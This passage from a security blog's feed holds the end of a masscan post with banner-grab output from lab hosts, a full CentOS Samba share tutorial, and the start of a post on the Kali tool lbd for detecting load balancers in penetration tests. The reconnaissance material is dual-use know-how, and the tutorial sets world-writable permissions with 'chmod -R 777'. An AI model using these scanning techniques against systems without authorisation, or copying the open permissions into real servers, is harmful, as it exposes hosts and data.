</span><span class='line'>Banner on port 3306/tcp on 192.168.217.133: [unknown] \x3e\x00\x00\x00\x0a5.0.51a-3ubuntu5\x00\x07\x00\x00\x00M`yb]-d3\x00,\xaa\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00q^e`0o`r\x3crLb\x00
</span><span class='line'>Banner on port 80/tcp on 192.168.217.131: [http] HTTP/1.1 200 OK\x0d\x0aDate: Sat, 10 Jun 2017 09:18:35 GMT\x0d\x0aServer: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips\x0d\x0aLast-Modified: Tue, 02 Aug 2016 13:07:09 GMT\x0d\x0aETag: \x2211-5391664f1e697\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0aContent-Length: 17\x0d\x0aConnection: close\x0d\x0aContent-Type: text/html; charset=UTF-8\x0d\x0a\x0d
</span><span class='line'>Banner on port 80/tcp on 192.168.217.133: [http] HTTP/1.1 200 OK\x0d\x0aDate: Sat, 10 Jun 2017 09:18:36 GMT\x0d\x0aServer: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch\x0d\x0aLast-Modified: Wed, 17 Mar 2010 14:08:25 GMT\x0d\x0aETag: \x22107f7-2d-481ffa5ca8840\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0aContent-Length: 45\x0d\x0aConnection: close\x0d\x0aContent-Type: text/html\x0d\x0a\x0d</span></code></pre></td></tr></table></div></figure>


<p>For this option to work, you have to give masscan its own IP address on the local subnet, something unused by another device. In fact, the recommendation from its homepage is to use it with its separate IP address whenever possible.</p>

<p>And here is how the XML output of the previous scan would look in a spreadsheet:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/masscan-xml.png" title="masscan xml" alt="masscan xml output"></p>

<p>Some other features are:</p>

<ul>
<li><p>output formats in xml, binary, grepable, list, or JSON</p></li>
<li><p>resume scans</p></li>
<li><p>exclude targets</p></li>
<li><p>runs in Linux, Windows, and Mac OS X</p></li>
</ul>


<h3>More resources</h3>

<ul>
<li><p><a href="http://blog.erratasec.com/2013/09/masscan-entire-internet-in-3-minutes.html">Robert Graham post on masscan</a></p></li>
<li><p><a href="https://josephpierini.blogspot.com/2016/06/using-masscan-with-top-ports.html">select common ports with Nmap and feed them to Masscan</a></p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ Your own qualities will help prevent \
</span><span class='line'>\ your advancement in the world.       /
</span><span class='line'> --------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Quick shares with Samba on CentOS]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/09/quick-shares-with-samba-on-centos/"/>
    <updated>2017-06-09T05:47:05-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/09/quick-shares-with-samba-on-centos</id>
    <content type="html"><![CDATA[<p>The interwebz is thundering with doomsday predictions about the <a href="https://blog.qualys.com/securitylabs/2017/05/26/samba-vulnerability-cve-2017-7494">Samba CVE-2017-7494 exploit</a>, and here I am, deciding that now is the best time to make a post on setting up Samba shares! xD</p>

<p>On a related note, if for some reason you can&rsquo;t patch the vulnerability yet, there is a workaround (with some drawbacks). Edit the global section in smb.conf and add the line <code>nt pipe support = no</code>.</p>

<!-- more -->


<p>Back to the matter at hand. First, let&rsquo;s verify if Samba is installed on the CentOS system:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpm -q samba
</span><span class='line'>package samba is not installed</span></code></pre></td></tr></table></div></figure>


<p>Since it&rsquo;s not installed on my machine, I installed it with <code>yum install samba</code>, and then ran the previous command again, to check the version:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpm -q samba
</span><span class='line'>samba-4.4.4-14.el7_3.x86_64</span></code></pre></td></tr></table></div></figure>


<p>Now, let&rsquo;s start Samba and see it running:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>service smb start
</span><span class='line'>Redirecting to /bin/systemctl start  smb.service
</span><span class='line'>service smb status
</span><span class='line'>Redirecting to /bin/systemctl status  smb.service
</span><span class='line'>● smb.service - Samba SMB Daemon
</span><span class='line'>   Loaded: loaded (/usr/lib/systemd/system/smb.service; disabled; vendor preset: disabled)
</span><span class='line'>   Active: active (running) since Thu 2017-06-08 10:56:54 EEST; 5s ago
</span><span class='line'> Main PID: 61874 (smbd)
</span><span class='line'>   Status: "smbd: ready to serve connections..."
</span><span class='line'>   CGroup: /system.slice/smb.service
</span><span class='line'>           ├─61874 /usr/sbin/smbd
</span><span class='line'>           ├─61875 /usr/sbin/smbd
</span><span class='line'>           ├─61876 /usr/sbin/smbd
</span><span class='line'>           └─61879 /usr/sbin/smbd
</span><span class='line'>
</span><span class='line'>Jun 08 10:56:52 localhost.localdomain systemd[1]: Starting Samba SMB Daemon...
</span><span class='line'>Jun 08 10:56:54 localhost.localdomain smbd[61874]: [2017/06/08 10:56:54.513901,  0] ../lib/util/become_daemon.c:124(daemon_ready)
</span><span class='line'>Jun 08 10:56:54 localhost.localdomain smbd[61874]:   STATUS=daemon 'smbd' finished starting up and ready to serve connections
</span><span class='line'>Jun 08 10:56:54 localhost.localdomain systemd[1]: Started Samba SMB Daemon.</span></code></pre></td></tr></table></div></figure>


<h2>Samba daemons</h2>

<p>The Samba functionality is contained within 3 daemons:</p>

<ul>
<li><p><strong>smbd</strong> &ndash; file sharing, printing services, authentication. Default ports are 139 and 445</p></li>
<li><p><strong>nmbd</strong> &ndash; NetBIOS name service requests and browsing protocols</p></li>
<li><p><strong>winbindd</strong> &ndash; used for Windows domains membership</p></li>
</ul>


<h2>Samba configuration</h2>

<p>The Samba configuration file is <code>/etc/samba/smb.conf</code>. Here is how a fresh config file looks after installation:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># See smb.conf.example for a more detailed config file or
</span><span class='line'># read the smb.conf manpage.
</span><span class='line'># Run 'testparm' to verify the config is correct after
</span><span class='line'># you modified it.
</span><span class='line'>
</span><span class='line'>[global]
</span><span class='line'>  workgroup = SAMBA
</span><span class='line'>  security = user
</span><span class='line'>
</span><span class='line'>  passdb backend = tdbsam
</span><span class='line'>
</span><span class='line'>  printing = cups
</span><span class='line'>  printcap name = cups
</span><span class='line'>  load printers = yes
</span><span class='line'>  cups options = raw
</span><span class='line'>
</span><span class='line'>[homes]
</span><span class='line'>  comment = Home Directories
</span><span class='line'>  valid users = %S, %D%w%S
</span><span class='line'>  browseable = No
</span><span class='line'>  read only = No
</span><span class='line'>  inherit acls = Yes
</span><span class='line'>
</span><span class='line'>[printers]
</span><span class='line'>  comment = All Printers
</span><span class='line'>  path = /var/tmp
</span><span class='line'>  printable = Yes
</span><span class='line'>  create mask = 0600
</span><span class='line'>  browseable = No
</span><span class='line'>
</span><span class='line'>[print$]
</span><span class='line'>  comment = Printer Drivers
</span><span class='line'>  path = /var/lib/samba/drivers
</span><span class='line'>  write list = root
</span><span class='line'>  create mask = 0664
</span><span class='line'>  directory mask = 0775</span></code></pre></td></tr></table></div></figure>


<p>For much more detailed information and examples, see the <a href="http://chousensha.github.io/downloads/code/smb.conf.example">smb.conf.example file</a></p>

<h2>Create Samba share</h2>

<p>In this example, let&rsquo;s create a share that users can also write to. First, create the directory that you will share: <code>mkdir -p /srv/samba/myshare</code>. I placed a text file with some random stuff inside. Then I gave full access to the path and its subfolders with <code>chmod -R 777 /srv/samba</code></p>

<p>Next, we need to create a Samba user, but this account is not the same as a user account on the system. We have to make a user account on the system before assigning it to Samba:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>adduser smbuser -s /sbin/nologin</span></code></pre></td></tr></table></div></figure>


<p>Here I created a user just for Samba, with no login shell. Attempting to login will give the user a message that they are not allowed to login. If you prefer that the user is disconnected with no message, you can specify <code>/bin/false</code> instead.</p>

<p>Then, I gave the user account a description, which you can find inside <em>/etc/passwd</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>usermod -c 'Samba access is allowed for this user' smbuser
</span><span class='line'>[root@localhost ~]# cat /etc/passwd | grep smbuser
</span><span class='line'>smbuser:x:1001:1001:Samba access is allowed for this user:/home/smbuser:/sbin/nologin</span></code></pre></td></tr></table></div></figure>


<p>Have to give the user account a password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost ~]# passwd smbuser
</span><span class='line'>Changing password for user smbuser.
</span><span class='line'>New password:
</span><span class='line'>Retype new password:
</span><span class='line'>passwd: all authentication tokens updated successfully.</span></code></pre></td></tr></table></div></figure>


<p>Next, we create a Samba user, by using the previously created account:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost ~]# smbpasswd -a smbuser
</span><span class='line'>New SMB password:
</span><span class='line'>Retype new SMB password:
</span><span class='line'>Added user smbuser.</span></code></pre></td></tr></table></div></figure>


<p>To be safe, check that the Samba user was created:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost ~]# pdbedit -L
</span><span class='line'>smbuser:1001:Samba access is allowed for this user</span></code></pre></td></tr></table></div></figure>


<p>We have the share location and the user, now we need to edit the smb.conf file with the relevant information:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[global]
</span><span class='line'>  # workgroup name or Windows NT domain name
</span><span class='line'>  workgroup = SAMBA
</span><span class='line'>  # default: user and password authentication
</span><span class='line'>  security = user
</span><span class='line'>  # optional comment for Windows
</span><span class='line'>  server string = Samba File Server
</span><span class='line'>  # default backend for user information
</span><span class='line'>  passdb backend = tdbsam
</span><span class='line'>
</span><span class='line'>[sharename]
</span><span class='line'>  path = /srv/samba/myshare
</span><span class='line'>  comment = Only authorized users
</span><span class='line'>  # allow these users
</span><span class='line'>  valid users = smbuser
</span><span class='line'>  # same can be achieved with writable = yes
</span><span class='line'>  read only = no  
</span><span class='line'>  # allow subnet range
</span><span class='line'>  allow hosts = 192.168.217.
</span><span class='line'>  # deny access
</span><span class='line'>  invalid users = root  </span></code></pre></td></tr></table></div></figure>


<p>I used comments for easier understanding, but for performance reasons, you might want to keep your file to minimum size, by removing all those comment lines. You can do that by keeping a configuration file with all the additional remarks, while using a smb.conf with only the required configuration. All the comments will be stripped from the config file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost samba]# testparm -s smb.conf.old &gt; smb.conf
</span><span class='line'>Load smb config files from smb.conf.old
</span><span class='line'>rlimit_max: increasing rlimit_max (1024) to minimum Windows limit (16384)
</span><span class='line'>Processing section "[sharename]"
</span><span class='line'>Loaded services file OK.
</span><span class='line'>Server role: ROLE_STANDALONE</span></code></pre></td></tr></table></div></figure>


<p>We checked that our config file is valid, so now it&rsquo;s time to test it. Restart Samba for the configurations to take effect with <code>service smb restart</code>. And now let&rsquo;s access the share! From another machine, I used <strong>smbclient</strong> to list the available services on the Samba server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smbclient -L 192.168.217.131 -U smbuser
</span><span class='line'>WARNING: The "syslog" option is deprecated
</span><span class='line'>Enter smbuser's password:
</span><span class='line'>Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
</span><span class='line'>
</span><span class='line'>  Sharename       Type      Comment
</span><span class='line'>  ---------       ----      -------
</span><span class='line'>  sharename       Disk      Only authorized users
</span><span class='line'>  IPC$            IPC       IPC Service (Samba File Server)
</span><span class='line'>Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
</span><span class='line'>
</span><span class='line'>  Server               Comment
</span><span class='line'>  ---------            -------
</span><span class='line'>
</span><span class='line'>  Workgroup            Master
</span><span class='line'>  ---------            -------</span></code></pre></td></tr></table></div></figure>


<p>There is one last step that you need to accomplish if you have SELinux enabled. You have to label the directory you&rsquo;re sharing with the <strong>samba_share_t</strong> label:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chcon -R -t samba_share_t /srv/samba</span></code></pre></td></tr></table></div></figure>


<p>Now the /srv/samba directory and everything it contains is labeled correctly, and SELinux won&rsquo;t interfere. View the security context of the path with:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -ldZ /srv/samba/
</span><span class='line'>drwxr-xr-x. root root unconfined_u:object_r:samba_share_t:s0 /srv/samba/</span></code></pre></td></tr></table></div></figure>


<p>Changes made with chcon are temporary. To survive a relabel or running <em>restorerecon</em>, make the changes permanent with:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>semanage fcontext -a -t samba_share_t "path(/.*)?"</span></code></pre></td></tr></table></div></figure>


<p>Then apply them with <code>restorecon -R -v /path</code>.</p>

<p>Finally, to connect to a share, use the syntax: <code>smbclient  //host/sharename -U username</code> (in the below examle, the name of my share is sharename, because laziness):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smbclient  //192.168.217.131/sharename -U smbuser
</span><span class='line'>WARNING: The "syslog" option is deprecated
</span><span class='line'>Enter smbuser's password:
</span><span class='line'>Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
</span><span class='line'>smb: \&gt; ls
</span><span class='line'>      .                                   D        0  Thu Jun  8 09:39:42 2017
</span><span class='line'>      ..                                  D        0  Thu Jun  8 09:26:38 2017
</span><span class='line'>      read.txt                            N       11  Thu Jun  8 09:39:42 2017
</span><span class='line'>
</span><span class='line'>          18307072 blocks of size 1024. 13091600 blocks available</span></code></pre></td></tr></table></div></figure>


<p>List available commands:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smb: \&gt; ?
</span><span class='line'>?              allinfo        altname        archive        backup         
</span><span class='line'>blocksize      cancel         case_sensitive cd             chmod          
</span><span class='line'>chown          close          del            dir            du             
</span><span class='line'>echo           exit           get            getfacl        geteas         
</span><span class='line'>hardlink       help           history        iosize         lcd            
</span><span class='line'>link           lock           lowercase      ls             l              
</span><span class='line'>mask           md             mget           mkdir          more           
</span><span class='line'>mput           newer          notify         open           posix          
</span><span class='line'>posix_encrypt  posix_open     posix_mkdir    posix_rmdir    posix_unlink   
</span><span class='line'>posix_whoami   print          prompt         put            pwd            
</span><span class='line'>q              queue          quit           readlink       rd             
</span><span class='line'>recurse        reget          rename         reput          rm             
</span><span class='line'>rmdir          showacls       setea          setmode        scopy          
</span><span class='line'>stat           symlink        tar            tarmode        timeout        
</span><span class='line'>translate      unlock         volume         vuid           wdel           
</span><span class='line'>logon          listconnect    showconnect    tcon           tdis           
</span><span class='line'>tid            logoff         ..             !              </span></code></pre></td></tr></table></div></figure>


<p>Download file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smb: \&gt; get read.txt
</span><span class='line'>getting file \read.txt of size 11 as read.txt (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)</span></code></pre></td></tr></table></div></figure>


<p>Delete file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smb: \&gt; del read.txt</span></code></pre></td></tr></table></div></figure>


<p>Upload file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smb: \&gt; put test.png
</span><span class='line'>putting file test.png as \test.png (0.2 kb/s) (average 0.2 kb/s)
</span><span class='line'>smb: \&gt; ls
</span><span class='line'>  .                                   D        0  Thu Jun  8 13:24:14 2017
</span><span class='line'>  ..                                  D        0  Thu Jun  8 09:26:38 2017
</span><span class='line'>  test.png                            A       35  Thu Jun  8 13:22:09 2017
</span><span class='line'>
</span><span class='line'>      18307072 blocks of size 1024. 13091480 blocks available</span></code></pre></td></tr></table></div></figure>


<p>From a Windows system, you can run <code>\192.168.217.131\sharename</code> to connect to the share, or use the <em>net use</em> command.</p>

<p>View shares:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>C:\Documents and Settings\admin&gt;net use
</span><span class='line'>New connections will be remembered.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Status       Local     Remote                    Network
</span><span class='line'>
</span><span class='line'>-------------------------------------------------------------------------------
</span><span class='line'>OK                     \\192.168.217.131\sharename
</span><span class='line'>                                                 Microsoft Windows Network
</span><span class='line'>The command completed successfully.</span></code></pre></td></tr></table></div></figure>


<p>Connect to shares:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>C:\Documents and Settings\admin&gt;net use S: \\192.168.217.131\sharename
</span><span class='line'>The command completed successfully.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>C:\Documents and Settings\admin&gt;s:
</span><span class='line'>
</span><span class='line'>S:\&gt;dir
</span><span class='line'> Volume in drive S is sharename
</span><span class='line'> Volume Serial Number is DCCC-194F
</span><span class='line'>
</span><span class='line'> Directory of S:\
</span><span class='line'>
</span><span class='line'>06/09/2017  02:24 AM    &lt;DIR&gt;          .
</span><span class='line'>06/08/2017  10:26 PM    &lt;DIR&gt;          ..
</span><span class='line'>06/09/2017  02:22 AM                35 test.png
</span><span class='line'>               1 File(s)             35 bytes
</span><span class='line'>               2 Dir(s)  13,405,708,288 bytes free</span></code></pre></td></tr></table></div></figure>


<h3>Other useful options</h3>

<p>You can drill down into the smb.conf file and customize it to your liking. Here are a few options:</p>

<ul>
<li><p>read list = user1, user2 &ndash; set read only users on a writable share</p></li>
<li><p>write list = user1, user2 &ndash; set write access for users on a read only share</p></li>
<li><p>deny hosts  = ip &ndash; deny access to the specified IPs</p></li>
<li><p>hide unreadable = yes &ndash; don&rsquo;t let users see files they don&rsquo;t have access to</p></li>
<li><p>browseable = no &ndash; hide shares from Windows network</p></li>
</ul>


<p>Key takeaways:</p>

<ul>
<li><p>server and share security levels are deprecated, so best to avoid them</p></li>
<li><p>specifying a share in the smb.conf file is not enough. Ensure that you have created the path and gave it sufficient permissins</p></li>
<li><p>Samba users need to already exist on the system</p></li>
<li><p>you can have both a well documented config file and a minimal size one for performance, by using <code>testparm -s</code></p></li>
<li><p>if you use SELinux, don&rsquo;t forget to label your share with <code>samba_share_t</code></p></li>
</ul>


<p>Learn more:</p>

<ul>
<li><p><a href="http://linux-training.be/linuxsrv.pdf">Samba section in Paul Cobbaut&rsquo;s Linux Servers course</a></p></li>
<li><p><a href="https://www.samba.org/samba/docs/man/manpages-3/smb.conf.5.html">smb.conf manpage</a> &ndash; The configuration file for the Samba suite</p></li>
<li><p><a href="https://www.centos.org/docs/5/html/Deployment_Guide-en-US/ch-samba.html">CentOS Samba guide</a></p></li>
<li><p><a href="smbpasswd%20-%20The%20Samba%20encrypted%20password%20file">smbpasswd man page</a> &ndash; The Samba encrypted password file</p></li>
<li><p><a href="https://www.samba.org/samba/docs/man/manpages/pdbedit.8.html">pdbedit manpage</a> &ndash; manage the SAM database (Database of Samba Users)</p></li>
<li><p><a href="https://www.samba.org/samba/docs/man/manpages-3/testparm.1.html">testparm manpage</a> &ndash; check an smb.conf configuration file for internal correctness</p></li>
<li><p><a href="https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html">smbclient manpage</a> &ndash; ftp-like client to access SMB/CIFS resources on servers</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ Nothing so needs reforming as other \
</span><span class='line'>| people's habits.                    |
</span><span class='line'>|                                     |
</span><span class='line'>\ -- Mark Twain                       /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[lbd - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/07/lbd-kali-linux-tools/"/>
    <updated>2017-06-07T05:46:27-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/07/lbd-kali-linux-tools</id>
    <content type="html"><![CDATA[<p>Load balancing is the practice of distributing traffic across multiple servers, in order to increase performance and reliability. With multiple servers offering the same resources, single points of failure are eliminated, and availability is increased. Load balancers may be set up in a way that users from certain geographic locations are sent to specific servers, in order to increase the speed of access.</p>

<p>Load balancing introduces some issue in penetration tests, because it interferes with the accuracy of the testing. This is why it&rsquo;s important to establish whether load balancers are in place, and if there are, taking that into account when performing the tests and writing the reports.</p>

<!-- more -->


<p>lbd (load balancing detector) is a Kali tool that is useful for determining the presence of load balancing.</p>

<p>Author: Stefan Behte</p>

<h2>lbd description</h2>

<blockquote><p>lbd (load balancing detector) detects if a given domain uses DNS and/or HTTP Load-Balancing (via Server: and Date:
header and diffs between server answers).</p></blockquote>

<h3>DNS load balancing</h3>

<p>In DNS load balancing, a system has a list of IPs that can respond to requests. When you request a resource, you hit on one of these IPs, and you need to test further to identify the exact target. If your target is <em>example.com</em>, and 3 IPs are serving that, when you find a vulnerability, you still have to determine which of these addresses is the vulnerable one (or if all are).</p>

<h3>HTTP load balancing</h3>

<p>One of the ways HTTP load balancing can be achieved is through cookies. This comes in handy in online stores and other such web applications that need to identify a client and send it to the same specific resource</p>

<h2>lbd options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lbd - load balancing detector 0.4 - Checks if a given domain uses load-balancing.
</span><span class='line'>                                    Written by Stefan Behte (http://ge.mine.nu)
</span><span class='line'>                                    Proof-of-concept! Might give false positives.
</span><span class='line'>usage: /usr/bin/lbd domain [port] {https}</span></code></pre></td></tr></table></div></figure>


<h2>lbd usage</h2>

<p>Let&rsquo;s now check a bunch of domains and see what load balancers we can find, if at all</p>

<ul>
<li>DNS and HTTP load balancing</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
